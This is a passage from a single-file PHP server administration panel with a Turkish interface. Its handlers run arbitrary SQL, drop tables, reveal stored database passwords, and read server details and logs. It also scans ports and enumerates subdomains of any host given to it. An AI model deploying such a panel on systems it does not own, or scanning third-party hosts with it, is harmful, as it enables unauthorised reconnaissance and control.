            if (!$conn) jerr('Bağlantı başarısız: ' . mysqli_connect_error());
            if (!@mysqli_set_charset($conn, 'utf8mb4')) @mysqli_set_charset($conn, 'utf8');
            if (empty($_SESSION['db_connections'])) $_SESSION['db_connections'] = [];
            $connId = 'c' . bin2hex(random_bytes(4));
            $_SESSION['db_connections'][$connId] = compact('host', 'user', 'pass', 'name', 'port');
            $databases = [];
            $dres = mysqli_query($conn, 'SHOW DATABASES');
            if ($dres) while ($drow = mysqli_fetch_array($dres)) $databases[] = $drow[0];
            jok(['connId' => $connId, 'server' => mysqli_get_server_info($conn), 'host' => $host, 'name' => $name, 'databases' => $databases]);
        }

        case 'db_disconnect': {
            $connId = (isset($_POST['connId']) ? $_POST['connId'] : '');
            if ($connId && isset($_SESSION['db_connections'][$connId])) unset($_SESSION['db_connections'][$connId]);
            jok();
        }

        case 'db_status': {
            $list = [];
            if (!empty($_SESSION['db_connections'])) {
                foreach ($_SESSION['db_connections'] as $id => $d) {
                    $list[] = ['connId' => $id, 'host' => $d['host'], 'name' => $d['name']];
                }
            }
            jok(['connections' => $list]);
        }

        case 'db_connection_info': {
            $connId = (isset($_POST['connId']) ? $_POST['connId'] : '');
            if (!$connId || empty($_SESSION['db_connections'][$connId])) jerr('Bağlantı bulunamadı.');
            $d = $_SESSION['db_connections'][$connId];
            jok(['host' => $d['host'], 'user' => $d['user'], 'pass' => $d['pass'], 'name' => $d['name'], 'port' => $d['port']]);
        }

        case 'db_databases': {
            $conn = dbConn();
            if (!$conn) jerr('Önce veritabanına bağlanın.');
            $res = mysqli_query($conn, 'SHOW DATABASES');
            $dbs = [];
            while ($row = mysqli_fetch_array($res)) $dbs[] = $row[0];
            $connId = (isset($_POST['connId']) ? $_POST['connId'] : '');
            $current = isset($_SESSION['db_connections'][$connId]['name']) ? $_SESSION['db_connections'][$connId]['name'] : '';
            jok(['databases' => $dbs, 'current' => $current]);
        }

        case 'db_use': {
            $name = trim((isset($_POST['name']) ? $_POST['name'] : ''));
            $connId = (isset($_POST['connId']) ? $_POST['connId'] : '');
            $conn = dbConn();
            if (!$conn) jerr('Önce veritabanına bağlanın.');
            if (!@mysqli_select_db($conn, $name)) jerr('Veritabanı seçilemedi.');
            if ($connId && isset($_SESSION['db_connections'][$connId])) $_SESSION['db_connections'][$connId]['name'] = $name;
            jok();
        }

        case 'db_tables': {
            $conn = dbConn();
            if (!$conn) jerr('Önce veritabanına bağlanın.');
            $res = mysqli_query($conn, 'SHOW TABLE STATUS');
            $tables = [];
            if ($res) while ($row = mysqli_fetch_assoc($res)) {
                $tables[] = [
                    'name' => $row['Name'],
                    'rows' => $row['Rows'],
                    'size' => humanSize(((isset($row['Data_length']) ? $row['Data_length'] : 0)) + ((isset($row['Index_length']) ? $row['Index_length'] : 0))),
                    'engine' => $row['Engine'],
                    'collation' => $row['Collation'],
                ];
            }
            jok(['tables' => $tables]);
        }

        case 'db_export_size': {
            $conn = dbConn();
            if (!$conn) jerr('Önce veritabanına bağlanın.');
            $table = (isset($_POST['table']) ? $_POST['table'] : '');
            $total = 0;
            if ($table) {
                $tEsc = mysqli_real_escape_string($conn, $table);
                $r = mysqli_query($conn, "SHOW TABLE STATUS LIKE '$tEsc'");
                if ($r && $row = mysqli_fetch_assoc($r)) {
                    $total = (isset($row['Data_length']) ? $row['Data_length'] : 0) + (isset($row['Index_length']) ? $row['Index_length'] : 0);
                }
            } else {
                $r = mysqli_query($conn, 'SHOW TABLE STATUS');
                if ($r) while ($row = mysqli_fetch_assoc($r)) {
                    $total += (isset($row['Data_length']) ? $row['Data_length'] : 0) + (isset($row['Index_length']) ? $row['Index_length'] : 0);
                }
            }
            jok(['bytes' => (int)$total, 'human' => humanSize($total)]);
        }

        case 'db_structure': {
            $conn = dbConn();
            $table = (isset($_POST['table']) ? $_POST['table'] : '');
            if (!$conn) jerr('Önce veritabanına bağlanın.');
            $tEsc = mysqli_real_escape_string($conn, $table);
            $res = mysqli_query($conn, "SHOW FULL COLUMNS FROM `$tEsc`");
            if (!$res) jerr(mysqli_error($conn));
            $cols = [];
            while ($row = mysqli_fetch_assoc($res)) $cols[] = $row;
            jok(['columns' => $cols]);
        }

        case 'db_browse': {
            $conn = dbConn();
            $table = (isset($_POST['table']) ? $_POST['table'] : '');
            $page = max(1, (int)((isset($_POST['page']) ? $_POST['page'] : 1)));
            $limit = 25;
            $offset = ($page - 1) * $limit;
            if (!$conn) jerr('Önce veritabanına bağlanın.');
            $tEsc = mysqli_real_escape_string($conn, $table);
            $countRes = mysqli_query($conn, "SELECT COUNT(*) c FROM `$tEsc`");
            $total = $countRes ? mysqli_fetch_assoc($countRes)['c'] : 0;
            $res = mysqli_query($conn, "SELECT * FROM `$tEsc` LIMIT $limit OFFSET $offset");
            if (!$res) jerr(mysqli_error($conn));
            $rows = []; $fields = [];
            foreach (mysqli_fetch_fields($res) as $f) $fields[] = $f->name;
            while ($row = mysqli_fetch_assoc($res)) $rows[] = $row;
            $keyRes = mysqli_query($conn, "SHOW KEYS FROM `$tEsc` WHERE Key_name = 'PRIMARY'");
            $pk = null;
            if ($keyRes && $r = mysqli_fetch_assoc($keyRes)) $pk = $r['Column_name'];
            jok(['rows' => $rows, 'fields' => $fields, 'total' => (int)$total, 'page' => $page, 'limit' => $limit, 'pk' => $pk]);
        }

        case 'db_query': {
            $conn = dbConn();
            $sql = (isset($_POST['sql']) ? $_POST['sql'] : '');
            if (!$conn) jerr('Önce veritabanına bağlanın.');
            if (trim($sql) === '') jerr('SQL boş olamaz.');
            $start = microtime(true);
            $res = mysqli_query($conn, $sql);
            $time = round(microtime(true) - $start, 4);
            if ($res === false) jerr(mysqli_error($conn));
            if ($res === true) jok(['type' => 'affected', 'affected' => mysqli_affected_rows($conn), 'time' => $time]);
            $rows = []; $fields = [];
            foreach (mysqli_fetch_fields($res) as $f) $fields[] = $f->name;
            while ($row = mysqli_fetch_assoc($res)) $rows[] = $row;
            jok(['type' => 'result', 'rows' => $rows, 'fields' => $fields, 'time' => $time, 'count' => count($rows)]);
        }

        case 'db_import': {
            $conn = dbConn();
            if (!$conn) jerr('Önce veritabanına bağlanın.');
            if (empty($_FILES['sqlfile']) || $_FILES['sqlfile']['error'] !== UPLOAD_ERR_OK) jerr('Dosya yüklenemedi.');
            $sql = file_get_contents($_FILES['sqlfile']['tmp_name']);
            if ($sql === false || trim($sql) === '') jerr('Dosya okunamadı veya boş.');
            $count = 0; $errors = [];
            if (mysqli_multi_query($conn, $sql)) {
                do {
                    $count++;
                    if ($err = mysqli_error($conn)) $errors[] = $err;
                    if (($r = mysqli_store_result($conn)) !== false) mysqli_free_result($r);
                } while (mysqli_more_results($conn) && mysqli_next_result($conn));
            } else {
                $errors[] = mysqli_error($conn);
            }
            jok(['statements' => $count, 'errors' => $errors]);
        }

        case 'db_row_update': {
            $conn = dbConn();
            $table = (isset($_POST['table']) ? $_POST['table'] : '');
            $pk = (isset($_POST['pk']) ? $_POST['pk'] : '');
            $pkVal = (isset($_POST['pkVal']) ? $_POST['pkVal'] : '');
            $data = json_decode((isset($_POST['data']) ? $_POST['data'] : '{}'), true) ?: [];
            if (!$conn || !$table || !$pk) jerr('Geçersiz istek.');
            $sets = [];
            foreach ($data as $k => $v) {
                $col = '`' . mysqli_real_escape_string($conn, $k) . '`';
                $sets[] = $col . ' = ' . ($v === null ? 'NULL' : "'" . mysqli_real_escape_string($conn, $v) . "'");
            }
            if (!$sets) jerr('Güncellenecek alan yok.');
            $sql = "UPDATE `" . mysqli_real_escape_string($conn, $table) . "` SET " . implode(', ', $sets) .
                   " WHERE `" . mysqli_real_escape_string($conn, $pk) . "` = '" . mysqli_real_escape_string($conn, $pkVal) . "' LIMIT 1";
            if (!mysqli_query($conn, $sql)) jerr(mysqli_error($conn));
            jok();
        }

        case 'db_row_delete': {
            $conn = dbConn();
            $table = (isset($_POST['table']) ? $_POST['table'] : '');
            $pk = (isset($_POST['pk']) ? $_POST['pk'] : '');
            $pkVal = (isset($_POST['pkVal']) ? $_POST['pkVal'] : '');
            if (!$conn || !$table || !$pk) jerr('Geçersiz istek.');
            $sql = "DELETE FROM `" . mysqli_real_escape_string($conn, $table) . "` WHERE `" .
                   mysqli_real_escape_string($conn, $pk) . "` = '" . mysqli_real_escape_string($conn, $pkVal) . "' LIMIT 1";
            if (!mysqli_query($conn, $sql)) jerr(mysqli_error($conn));
            jok();
        }

        case 'db_rows_delete_bulk': {
            $conn = dbConn();
            $table = (isset($_POST['table']) ? $_POST['table'] : '');
            $pk = (isset($_POST['pk']) ? $_POST['pk'] : '');
            $pkVals = json_decode((isset($_POST['pkVals']) ? $_POST['pkVals'] : '[]'), true);
            if (!$conn || !$table || !$pk || !is_array($pkVals) || !count($pkVals)) jerr('Geçersiz istek.');
            $tEsc = mysqli_real_escape_string($conn, $table);
            $pkEsc = mysqli_real_escape_string($conn, $pk);
            $deleted = 0; $errors = [];
            foreach ($pkVals as $v) {
                $sql = "DELETE FROM `$tEsc` WHERE `$pkEsc` = '" . mysqli_real_escape_string($conn, $v) . "' LIMIT 1";
                if (mysqli_query($conn, $sql)) $deleted += mysqli_affected_rows($conn);
                else $errors[] = mysqli_error($conn);
            }
            jok(['deleted' => $deleted, 'errors' => $errors]);
        }

        case 'db_row_insert': {
            $conn = dbConn();
            $table = (isset($_POST['table']) ? $_POST['table'] : '');
            $data = json_decode((isset($_POST['data']) ? $_POST['data'] : '{}'), true);
            if (!$conn || !$table || !is_array($data) || !count($data)) jerr('Geçersiz istek.');
            $cols = []; $vals = [];
            foreach ($data as $k => $v) {
                $cols[] = '`' . mysqli_real_escape_string($conn, $k) . '`';
                $vals[] = $v === null ? 'NULL' : "'" . mysqli_real_escape_string($conn, $v) . "'";
            }
            $sql = "INSERT INTO `" . mysqli_real_escape_string($conn, $table) . "` (" . implode(',', $cols) . ") VALUES (" . implode(',', $vals) . ")";
            if (!mysqli_query($conn, $sql)) jerr(mysqli_error($conn));
            jok(['id' => mysqli_insert_id($conn)]);
        }

        case 'db_drop_table': {
            $conn = dbConn(); $table = (isset($_POST['table']) ? $_POST['table'] : '');
            if (!$conn || !$table) jerr('Geçersiz istek.');
            if (!mysqli_query($conn, "DROP TABLE `" . mysqli_real_escape_string($conn, $table) . "`")) jerr(mysqli_error($conn));
            jok();
        }

        case 'db_drop_tables_bulk': {
            $conn = dbConn();
            $tables = json_decode((isset($_POST['tables']) ? $_POST['tables'] : '[]'), true);
            if (!$conn || !is_array($tables) || !count($tables)) jerr('Geçersiz istek.');
            $ok = 0; $errors = [];
            foreach ($tables as $t) {
                if (mysqli_query($conn, "DROP TABLE `" . mysqli_real_escape_string($conn, $t) . "`")) $ok++;
                else $errors[] = $t . ': ' . mysqli_error($conn);
            }
            jok(['dropped' => $ok, 'errors' => $errors]);
        }

        case 'db_truncate_table': {
            $conn = dbConn(); $table = (isset($_POST['table']) ? $_POST['table'] : '');
            if (!$conn || !$table) jerr('Geçersiz istek.');
            if (!mysqli_query($conn, "TRUNCATE TABLE `" . mysqli_real_escape_string($conn, $table) . "`")) jerr(mysqli_error($conn));
            jok();
        }

        case 'db_truncate_tables_bulk': {
            $conn = dbConn();
            $tables = json_decode((isset($_POST['tables']) ? $_POST['tables'] : '[]'), true);
            if (!$conn || !is_array($tables) || !count($tables)) jerr('Geçersiz istek.');
            $ok = 0; $errors = [];
            foreach ($tables as $t) {
                if (mysqli_query($conn, "TRUNCATE TABLE `" . mysqli_real_escape_string($conn, $t) . "`")) $ok++;
                else $errors[] = $t . ': ' . mysqli_error($conn);
            }
            jok(['truncated' => $ok, 'errors' => $errors]);
        }

        case 'db_create_table': {
            $conn = dbConn();
            $table = trim((isset($_POST['table']) ? $_POST['table'] : ''));
            $columns = json_decode((isset($_POST['columns']) ? $_POST['columns'] : '[]'), true) ?: [];
            if (!$conn || !$table || !$columns) jerr('Geçersiz istek.');
            $defs = [];
            foreach ($columns as $c) {
                $name = mysqli_real_escape_string($conn, $c['name']);
                $type = preg_replace('/[^A-Za-z0-9\(\),]/', '', $c['type']);
                $extra = '';
                if (!empty($c['pk'])) $extra .= ' PRIMARY KEY';
                if (!empty($c['ai'])) $extra .= ' AUTO_INCREMENT';
                $defs[] = "`$name` $type$extra";
            }
            $sql = "CREATE TABLE `" . mysqli_real_escape_string($conn, $table) . "` (" . implode(', ', $defs) . ")";
            if (!mysqli_query($conn, $sql)) jerr(mysqli_error($conn));
            jok();
        }


        case 'hash_calc': {
            $text = (isset($_POST['text']) ? $_POST['text'] : '');
            $md5 = md5($text);
            $sha1 = sha1($text);
            $algos = function_exists('hash_algos') ? hash_algos() : [];
            $sha256 = hash('sha256', $text);
            $sha512 = hash('sha512', $text);
            $sha3_256 = in_array('sha3-256', $algos, true) ? hash('sha3-256', $text) : null;
            $sha3_512 = in_array('sha3-512', $algos, true) ? hash('sha3-512', $text) : null;
            $ripemd160 = in_array('ripemd160', $algos, true) ? hash('ripemd160', $text) : null;
            $crc32 = in_array('crc32b', $algos, true) ? hash('crc32b', $text) : null;
            $bcrypt = function_exists('password_hash') ? password_hash($text, PASSWORD_BCRYPT, ['cost' => 10]) : null;
            jok([
                'md5' => $md5,
                'sha1' => $sha1,
                'md5_sha1' => md5($sha1),
                'sha1_md5' => sha1($md5),
                'sha256' => $sha256,
                'sha512' => $sha512,
                'sha3_256' => $sha3_256,
                'sha3_512' => $sha3_512,
                'ripemd160' => $ripemd160,
                'crc32b' => $crc32,
                'bcrypt' => $bcrypt,
            ]);
        }

        case 'server_info': {
            $diskTotal = function_exists('disk_total_space') ? @disk_total_space('/') : false;
            $diskFree = function_exists('disk_free_space') ? @disk_free_space('/') : false;
            $currentUser = function_exists('get_current_user') ? @get_current_user() : false;
            jok([
                'php_version' => PHP_VERSION,
                'os' => function_exists('php_uname') ? @php_uname() : PHP_OS,
                'server_software' => (isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : '-'),
                'server_addr' => (isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : '-'),
                'client_addr' => (isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '-'),
                'host' => isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : (isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : '-'),
                'document_root' => (isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '-'),
                'panel_path' => __FILE__,
                'disk_total' => $diskTotal ? humanSize($diskTotal) : '-',
                'disk_free' => $diskFree ? humanSize($diskFree) : '-',
                'disk_used_pct' => ($diskTotal && $diskFree) ? round((($diskTotal - $diskFree) / $diskTotal) * 100, 1) : null,
                'memory_limit' => ini_get('memory_limit'),
                'upload_max_filesize' => ini_get('upload_max_filesize'),
                'post_max_size' => ini_get('post_max_size'),
                'max_execution_time' => ini_get('max_execution_time'),
                'current_user' => $currentUser !== false && $currentUser !== '' ? $currentUser : '-',
                'extensions' => [
                    'mysqli' => extension_loaded('mysqli'), 'zip' => extension_loaded('zip'),
                    'curl' => extension_loaded('curl'), 'gd' => extension_loaded('gd'),
                    'mbstring' => extension_loaded('mbstring'), 'openssl' => extension_loaded('openssl'),
                ],
            ]);
        }

        case 'read_error_log': {
            $path = ini_get('error_log');
            if (!$path || !is_file($path) || !is_readable($path)) {
                jerr('Hata günlüğü dosyası bulunamadı ya da erişilemiyor. (php.ini "error_log" ayarı: ' . ($path !== false && $path !== '' ? $path : 'tanımsız') . ')');
            }
            $size = filesize($path);
            $maxRead = 200 * 1024;
            $fp = fopen($path, 'rb');
            if ($size > $maxRead) fseek($fp, -$maxRead, SEEK_END);
            $content = fread($fp, $maxRead);
            fclose($fp);
            jok(['content' => $content, 'path' => $path, 'size' => humanSize($size), 'truncated' => $size > $maxRead]);
        }

        case 'ssl_cert_info': {
            if (!function_exists('openssl_x509_parse') || !function_exists('stream_socket_client')) {
                jerr('Bu sunucuda OpenSSL desteği bulunmuyor.');
            }
            $host = normalizeDomain(isset($_POST['domain']) ? $_POST['domain'] : '');
            if (!$host) $host = preg_replace('/:\d+$/', '', isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '');
            if (!$host) jerr('Alan adı tespit edilemedi.');
            $context = stream_context_create(['ssl' => [
                'capture_peer_cert' => true, 'verify_peer' => false, 'verify_peer_name' => false,
            ]]);
            $client = @stream_socket_client('ssl://' . $host . ':443', $errno, $errstr, 8, STREAM_CLIENT_CONNECT, $context);
            if (!$client) jerr('SSL bağlantısı kurulamadı (443 portu kapalı olabilir ya da bu alan adında SSL yok): ' . $errstr);
            $params = stream_context_get_params($client);
            fclose($client);
            if (empty($params['options']['ssl']['peer_certificate'])) jerr('Sertifika bilgisi alınamadı.');
            $cert = openssl_x509_parse($params['options']['ssl']['peer_certificate']);
            if (!$cert) jerr('Sertifika ayrıştırılamadı.');
            $now = time();
            $daysLeft = isset($cert['validTo_time_t']) ? (int)floor(($cert['validTo_time_t'] - $now) / 86400) : null;
            jok([
                'host' => $host,
                'commonName' => isset($cert['subject']['CN']) ? $cert['subject']['CN'] : '-',
                'issuer' => isset($cert['issuer']['O']) ? $cert['issuer']['O'] : (isset($cert['issuer']['CN']) ? $cert['issuer']['CN'] : '-'),
                'validFrom' => isset($cert['validFrom_time_t']) ? date('Y-m-d H:i', $cert['validFrom_time_t']) : '-',
                'validTo' => isset($cert['validTo_time_t']) ? date('Y-m-d H:i', $cert['validTo_time_t']) : '-',
                'daysLeft' => $daysLeft,
                'altNames' => isset($cert['extensions']['subjectAltName']) ? $cert['extensions']['subjectAltName'] : '-',
            ]);
        }

        case 'whois_lookup': {
            $domain = normalizeDomain(isset($_POST['domain']) ? $_POST['domain'] : '');
            if (!$domain || !preg_match('/^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/', $domain)) jerr('Geçerli bir alan adı girin (ör. ornek.com).');
            $raw = whoisQuery($domain);
            if (!$raw) jerr('WHOIS sorgusu başarısız oldu (sunucunun 43 numaralı porta çıkışı engelli olabilir).');
            jok(['domain' => $domain, 'raw' => $raw]);
        }

        case 'subdomain_scan': {
            $domain = normalizeDomain(isset($_POST['domain']) ? $_POST['domain'] : '');
            if (!$domain) jerr('Alan adı girin.');
            $common = ['www','mail','ftp','webmail','cpanel','whm','ns1','ns2','smtp','pop','imap','admin','api',
                'dev','test','staging','blog','shop','store','app','portal','vpn','remote','secure','cdn','static',
                'm','mobile','support','help','docs','status','beta','demo','panel','db','sql','git','ci','forum',
                'news','media','images','files','download','upload','autodiscover','autoconfig','pay','payment'];
            $found = [];
            foreach ($common as $sub) {
                $host = $sub . '.' . $domain;
                $ip = @gethostbyname($host);
                if ($ip && $ip !== $host) $found[] = ['sub' => $host, 'ip' => $ip];
            }
            jok(['domain' => $domain, 'found' => $found, 'checked' => count($common)]);
        }

        case 'port_scan': {
            $host = normalizeDomain(isset($_POST['host']) ? $_POST['host'] : '');
            if (!$host) jerr('Sunucu adresi girin.');
            $commonPorts = [
                21=>'FTP', 22=>'SSH', 23=>'Telnet', 25=>'SMTP', 53=>'DNS', 80=>'HTTP', 110=>'POP3',
                143=>'IMAP', 443=>'HTTPS', 445=>'SMB', 465=>'SMTPS', 587=>'SMTP-Submission', 993=>'IMAPS',
                995=>'POP3S', 3306=>'MySQL', 3389=>'RDP', 5432=>'PostgreSQL', 6379=>'Redis', 8080=>'HTTP-Alt',
                8443=>'HTTPS-Alt', 27017=>'MongoDB',
            ];
            $open = [];
            foreach ($commonPorts as $port => $service) {
                $fp = @fsockopen($host, $port, $errno, $errstr, 1.5);
                if ($fp) { $open[] = ['port' => $port, 'service' => $service]; fclose($fp); }
            }
            jok(['host' => $host, 'open' => $open, 'checked' => count($commonPorts)]);
        }

        case 'dns_lookup': {
            $domain = normalizeDomain(isset($_POST['domain']) ? $_POST['domain'] : '');
            if (!$domain) jerr('Alan adı girin.');
            if (!function_exists('dns_get_record')) jerr('Bu sunucuda dns_get_record fonksiyonu yok.');
            $types = ['A'=>DNS_A, 'AAAA'=>DNS_AAAA, 'MX'=>DNS_MX, 'TXT'=>DNS_TXT, 'NS'=>DNS_NS, 'CNAME'=>DNS_CNAME, 'SOA'=>DNS_SOA];
            $records = [];
            foreach ($types as $label => $const) {
                $res = @dns_get_record($domain, $const);
                if ($res) foreach ($res as $r) {
                    $value = '';
                    if (isset($r['ip'])) $value = $r['ip'];
                    elseif (isset($r['ipv6'])) $value = $r['ipv6'];
                    elseif (isset($r['target'])) $value = $r['target'];
                    elseif (isset($r['txt'])) $value = $r['txt'];
                    elseif (isset($r['mname'])) $value = 'mname=' . $r['mname'] . ' rname=' . (isset($r['rname']) ? $r['rname'] : '');
                    if (isset($r['pri'])) $value = 'priority=' . $r['pri'] . ' ' . $value;
                    $records[] = ['type' => $label, 'host' => isset($r['host']) ? $r['host'] : $domain, 'value' => $value, 'ttl' => isset($r['ttl']) ? $r['ttl'] : ''];
                }
            }
            jok(['domain' => $domain, 'records' => $records]);
        }

        case 'http_header_check': {
            $url = trim(isset($_POST['url']) ? $_POST['url'] : '');
            if (!preg_match('#^https?://#i', $url)) $url = 'https://' . $url;
            if (!filter_var($url, FILTER_VALIDATE_URL)) jerr('Geçerli bir URL girin.');
            $context = stream_context_create([
                'http' => ['method' => 'HEAD', 'timeout' => 8, 'follow_location' => 0, 'ignore_errors' => true],
                'ssl' => ['verify_peer' => false, 'verify_peer_name' => false],
            ]);
            $result = @get_headers($url, 1, $context);
            if ($result === false) jerr('Bağlantı kurulamadı.');
            jok(['url' => $url, 'headers' => $result]);
        }

        default:
            jerr('Bilinmeyen eylem.');
    }
}

if (!isLoggedIn()) {
    $err = (isset($_SESSION['login_error']) ? $_SESSION['login_error'] : '');
    unset($_SESSION['login_error']);
    ?>
<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title><?= htmlspecialchars(PANEL_NAME) ?> Panel — Giriş</title>
<style>
:root{
  --bg:#181513; --bg2:#211d1a; --card:#23201d; --border:#3a352f; --border2:#4a443c;
  --text:#f2ede6; --text2:#b9b0a4; --accent:#d97757; --accent2:#c9663f; --danger:#e5484d; --success:#4ca97e;
}
*{box-sizing:border-box; margin:0; padding:0;}
body{
  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
  background:radial-gradient(circle at 30% 20%, #241f1b 0%, #171412 60%);
  color:var(--text); min-height:100vh; display:flex; align-items:center; justify-content:center;
}
.login-card{ width:360px; background:var(--card); border:1px solid var(--border); border-radius:16px; padding:36px 32px; box-shadow:0 20px 60px rgba(0,0,0,.5); }
.logo{display:flex; align-items:center; gap:12px; margin-bottom:28px;}
.logo-icon{width:40px; height:40px; border-radius:11px; background:var(--accent); display:flex; align-items:center; justify-content:center; font-weight:700; font-size:18px; color:#1c1512;}
.logo-text{font-size:20px; font-weight:600; letter-spacing:-.02em;}
.logo-sub{font-size:12px; color:var(--text2);}
label{font-size:13px; color:var(--text2); display:block; margin-bottom:6px;}
input[type=password]{ width:100%; padding:11px 14px; border-radius:9px; border:1px solid var(--border2); background:var(--bg2); color:var(--text); font-size:14px; outline:none; transition:border-color .15s; }
input[type=password]:focus{border-color:var(--accent);}
button{ width:100%; margin-top:18px; padding:11px; border:none; border-radius:9px; background:var(--accent); color:#1c1512; font-weight:600; font-size:14px; cursor:pointer; transition:background .15s; }
button:hover{background:var(--accent2);}
.err{background:rgba(229,72,77,.12); border:1px solid rgba(229,72,77,.35); color:#ff9a9d; padding:10px 12px; border-radius:8px; font-size:13px; margin-bottom:16px;}
.foot{margin-top:20px; text-align:center; font-size:11.5px; color:#7a7267;}
</style>
</head>
<body>
<div class="login-card">
  <div class="logo">
    <div class="logo-icon">P</div>
    <div>
      <div class="logo-text"><?= htmlspecialchars(PANEL_NAME) ?></div>
      <div class="logo-sub">Sunucu Yönetim Paneli</div>
    </div>
  </div>
  <?php if ($err): ?><div class="err"><?= htmlspecialchars($err) ?></div><?php endif; ?>
  <form method="post" autocomplete="off">
    <label for="password">Şifre</label>
    <input type="password" name="password" id="password" autofocus required>
    <button type="submit" name="do_login" value="1">Giriş Yap</button>
  </form>
  <div class="foot">Bu panele yalnızca yetkili kişiler erişmelidir.</div>
</div>
</body>
</html>
<?php
    exit;
}

$csrf = $_SESSION['csrf'];
?>
<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title><?= htmlspecialchars(PANEL_NAME) ?> Panel</title>
<style>
:root{
  --bg:#171412; --bg2:#1e1a17; --panel:#211d1a; --card:#26221e; --border:#38332c; --border2:#4a443c;
  --text:#f2ede6; --text2:#b3aa9d; --text3:#8a8175; --accent:#d97757; --accent-dim:rgba(217,119,87,.15);
  --accent2:#c9663f; --danger:#e5484d; --danger-dim:rgba(229,72,77,.12); --success:#4ca97e; --success-dim:rgba(76,169,126,.12);
  --radius:10px; --mono:'SFMono-Regular',Consolas,'Liberation Mono',Menlo,monospace;
}
html[data-theme="light"]{
  --bg:#faf8f4; --bg2:#f2ede4; --panel:#ffffff; --card:#f6f1e8; --border:#e6ddcd; --border2:#d9cdb6;
  --text:#2b2620; --text2:#655c4e; --text3:#8c8271; --accent:#c96442; --accent-dim:rgba(201,100,66,.12);
  --accent2:#b3563a; --danger:#d13b38; --danger-dim:rgba(209,59,56,.1); --success:#3f8f63; --success-dim:rgba(63,143,99,.1);
}
*{box-sizing:border-box;}
html,body{margin:0; padding:0; height:100%;}
body{ font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; background:var(--bg); color:var(--text); font-size:14px; overflow:hidden; transition:background .15s,color .15s; }
::-webkit-scrollbar{width:9px; height:9px;}
::-webkit-scrollbar-thumb{background:#3a352f; border-radius:6px;}
::-webkit-scrollbar-thumb:hover{background:#4a443c;}
button{font-family:inherit; cursor:pointer;}
input,textarea,select{font-family:inherit;}
a{color:inherit;}

.app{display:flex; height:100vh;}

.sidebar{ width:230px; background:var(--panel); border-right:1px solid var(--border); display:flex; flex-direction:column; flex-shrink:0; }
.brand{display:flex; align-items:center; gap:10px; padding:18px 16px; border-bottom:1px solid var(--border);}
.brand-icon{width:32px; height:32px; border-radius:9px; background:var(--accent); display:flex; align-items:center; justify-content:center; font-weight:700; color:#1c1512; font-size:15px;}
.brand-name{font-weight:600; font-size:15px; letter-spacing:-.02em;}
.brand-sub{font-size:10.5px; color:var(--text3);}

.nav{padding:12px 10px; flex:1;}
.nav-item{ display:flex; align-items:center; gap:10px; padding:10px 12px; border-radius:8px; color:var(--text2); font-size:13.5px; font-weight:500; cursor:pointer; margin-bottom:2px; transition:.12s; user-select:none; }
.nav-item svg{width:17px; height:17px; flex-shrink:0;}
.nav-item:hover{background:var(--card); color:var(--text);}
.nav-item.active{background:var(--accent-dim); color:var(--accent);}

.sidebar-foot{padding:12px; border-top:1px solid var(--border);}
.logout-btn{ display:flex; align-items:center; gap:8px; width:100%; padding:9px 12px; border-radius:8px; background:transparent; border:1px solid var(--border2); color:var(--text2); font-size:13px; transition:.12s; }
.logout-btn:hover{border-color:var(--danger); color:var(--danger);}
.logout-btn svg{width:15px; height:15px;}

.main{flex:1; display:flex; flex-direction:column; min-width:0; min-height:0;}
.view-container{display:flex; flex-direction:column; flex:1; min-height:0;}
.topbar{ min-height:56px; border-bottom:1px solid var(--border); display:flex; align-items:center; padding:8px 20px; gap:14px; flex-shrink:0; background:var(--bg2); flex-wrap:wrap; }
.crumbs{display:flex; align-items:center; gap:4px; font-size:13px; color:var(--text2); flex-wrap:wrap; overflow:hidden;}
.crumb{padding:4px 8px; border-radius:6px; cursor:pointer;}
.crumb:hover{background:var(--card); color:var(--text);}
.crumb-sep{color:var(--text3);}
.spacer{flex:1;}

.path-jump{display:flex; align-items:center; gap:6px;}
.path-jump input{ background:var(--card); border:1px solid var(--border2); border-radius:8px; padding:6px 10px; color:var(--text); font-size:12px; font-family:var(--mono); width:260px; outline:none; }
.path-jump input:focus{border-color:var(--accent);}

.view{flex:1; overflow:auto; padding:20px; min-height:0;}
.view.view-files-scroll{ display:flex; flex-direction:column; overflow:hidden; }
.view.view-files-scroll .toolbar{ flex-shrink:0; }
.view.view-files-scroll .table-wrap{ flex:1; min-height:0; overflow-y:auto; }
.view.view-db-scroll{ display:flex; flex-direction:column; overflow:hidden; }
.view.view-db-scroll > *:not(.conn-tabs-bar):not(.db-tabs){ flex:1; min-height:0; overflow-y:auto; }
.hidden{display:none !important;}

.toolbar{display:flex; align-items:center; gap:8px; margin-bottom:16px; flex-wrap:wrap;}
.btn{ display:inline-flex; align-items:center; gap:7px; padding:8px 13px; border-radius:8px; border:1px solid var(--border2); background:var(--card); color:var(--text); font-size:13px; font-weight:500; transition:.12s; }
.btn svg{width:15px; height:15px;}
.btn:hover{border-color:var(--accent); color:var(--accent);}
.btn-primary{background:var(--accent); border-color:var(--accent); color:#fff;}
.btn-primary:hover{background:var(--accent2); border-color:var(--accent2); color:#fff;}
.btn-danger:hover{border-color:var(--danger); color:var(--danger);}
.btn-sm{padding:5px 9px; font-size:12px;}
.btn:disabled{opacity:.4; cursor:not-allowed;}
.search-box{ display:flex; align-items:center; gap:7px; background:var(--card); border:1px solid var(--border2); border-radius:8px; padding:7px 11px; min-width:200px; }
.search-box svg{width:15px; height:15px; color:var(--text3); flex-shrink:0;}
.search-box input{background:transparent; border:none; outline:none; color:var(--text); font-size:13px; width:100%;}
.toolbar-select{padding:7px 10px; border-radius:8px; border:1px solid var(--border2); background:var(--card); color:var(--text); font-size:12.5px; outline:none;}
